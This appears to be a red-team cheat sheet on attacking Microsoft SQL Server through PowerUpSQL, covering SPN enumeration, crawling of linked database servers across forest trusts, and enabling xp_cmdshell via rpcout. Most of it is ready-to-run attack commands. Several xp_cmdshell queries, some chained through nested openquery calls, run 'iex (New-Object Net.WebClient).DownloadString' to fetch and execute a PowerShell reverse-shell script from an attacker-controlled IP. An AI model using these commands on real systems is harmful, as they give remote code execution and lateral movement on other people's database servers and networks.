# Forest Trusts [ MSSQL Abuse ; Part 1 ]

+ We can use tools to speed the process up
1. https://github.com/NetSPI/PowerUpSQL/blob/master/PowerUpSQL.psd1

+ For importing use the following command
```powershell
Import-Module .\PowerUpSQL.psd1
```

---

## Methodology/Steps
> 1. Check the SPN's
> 2. Check which SPN's you have access to
> 3. Check the Privileges you have of the above filtered SPN's
> 4. Keep note of the **Instance-Name**, **ServicePrincipalName** and the **DomainAccount-Name**
> 5. If you find any service with *higher privileges* continue below to abuse it

---

## PowerUpSQL [ Basic Enumeration ]
### 1. Enumerate SPN
```powershell
Get-SQLInstanceDomain
```

### 2. Check Access
```powershell
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

### 3. Check Privileges / Gather Infromation
```powershell
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

---

# MSSQL Database Links [ MSSQL Abuse ; Part 2 ]
-   A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources.
-   In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures.
-   Database links work even across forest trusts.

## Execute commands on target server
-   On the target server, either xp_cmdshell should be already enabled; or
-   If **rpcout** is enabled (disabled by default), xp_cmdshell can be enabled using: 
  ```mssql
  EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"
  ```
-   If **rpcout** is disabled but we are **sa**, it can be enabled with 
  ```mssql
  EXEC sp_serveroption 'LinkedServer', 'rpc out', 'true';
  ```

---

## Methodology/Steps
> 1. Check the SQL Server link
> 2. Keep note if you have link to any other database in **DatabaseLinkName**
> 3. If SysAdmin:0 means that we will not be allowed to enable **xp_cmdshell**
> 4. Keep on enumerating and check all the linked databases you have access to
> 5. Now we can try to execute commands through out all the linked databases found

---

## PowerUpSQL [ Abusing the privileges ]
### 1. Enumerate SQL Server links
```powershell
Get-SQLServerLink -Instance <instanceName> -Verbose
select * from master..sysservers
```

### 2. Enumerate DB links
```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mysql -Verbose
select * from openquery("<instanceName>",'select * from openquery("<linkedInstance>",''select * from master..sysservers'')')
```

### 3. Execute commands on target server
```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mysql -Query "exec master..xp_cmdshell 'whoami'" | ft
```

### Download file on target server
```powershell
Get-SQLServerLinkCrawl -Instance <instanceName> -Query 'exec master..xp_cmdshell "powershell -c iex (new-object net.webclient).downloadstring(''http://IP:8080/Invoke-HelloWorld.ps1'',''C:\Windows\Temp\Invoke-HelloWorld.ps1'')"'

Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.21/Invoke-PowerShellTcp.ps1'')"'
```

---

# Extra Commands

## Basic SQL Server queries for DB enumeration
Also works with **Get-SQLServerLinkCrawl**
```powershell
#View all db in an instance
Get-SQLQuery -Instance <instanceName> -Query "SELECT name FROM sys.databases"

#View all tables
Get-SQLQuery -Instance <instanceName> -Query "SELECT * FROM dbName.INFORMATION_SCHEMA.TABLES" 

#View all cols in all tables in a db
Get-SQLQuery -Instance <instanceName> -Query "SELECT * FROM dbName.INFORMATION_SCHEMA.columns"

#View data in table
Get-SQLQuery -Instance <instanceName> -Query "USE dbName;SELECT * FROM tableName"

# manually enumerate linked servers
select * from master..sysservers

# Openquery function can be used to run queries on a linked database
select * from openquery("192.168.23.25",'select * from master..sysservers')

# Openquery queries can be chained to access links within links (nested links)
select * from openquery("192.168.23.25 ",'select * from openquery("db-sqlsrv",''select @@version as version'')')

# From the initial SQL server, OS commands can be executed using nested link queries
select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version;exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.X/I nvoke-PowerShellTcp.ps1'''')"'')')

# How to enable rpcout in a linked DB
# first get a rev shell on the parent DB
Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"
Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc out', @optvalue='TRUE'"
Invoke-SqlCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT ""db-sqlsrv"""

# Query command to a linked DB
Get-SQLQuery -Instance <instanceName> -Query "USE dbName;SELECT * FROM tableName" -QueryTarget db-sqlsrv
```
